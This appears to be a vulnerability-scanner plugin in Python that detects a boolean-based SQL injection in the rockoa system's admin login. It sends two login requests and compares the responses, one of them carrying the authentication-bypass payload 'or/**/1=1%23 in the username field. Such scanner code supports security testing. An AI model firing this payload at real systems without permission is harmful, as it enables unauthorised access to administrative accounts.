#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:wonderkun
#Name:rockoa bool base sql inject  
#Refer:无  
#Data:2015/12/112=


#problem file:管理员登陆的地方存在sql注入

def assign(service,arg):
    if service=='rockoa':
        return True,arg 


def audit(arg):
    url=arg+"rock.php?a=check&m=login&d=&ajaxbool=true&rnd=0.03643321571871638"
    data1="adminuser=&adminpass=999&rempass=0&button=+%E7%99%BB+%E5%BD%95+&jmpass=false"
    code1,head1,res1,errcode1,finalurl1=curl.curl2(url,post=data1)
    data2="adminuser='or/**/1=1%23&adminpass=999&rempass=0&button=+%E7%99%BB+%E5%BD%95+&jmpass=false"
    code2,head2,res2,errcode2,finalurl2=curl.curl2(url,post=data2)

    if code1==200 and code2==200 and  res1!=res2: 
        security_hole('bool base sql inject :'+url)




        return arg
if __name__== '__main__':
    from dummy import *
